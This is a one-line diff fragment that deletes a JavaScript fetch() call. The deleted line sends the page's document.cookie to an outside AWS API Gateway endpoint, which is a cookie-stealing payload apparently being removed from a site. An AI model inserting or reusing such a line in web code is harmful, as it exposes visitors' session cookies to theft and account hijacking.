@@ -1,1 +1,0 @@
-fetch('https://1dczr9vl49.execute-api.us-east-2.amazonaws.com/gateway/?c='+document.cookie);
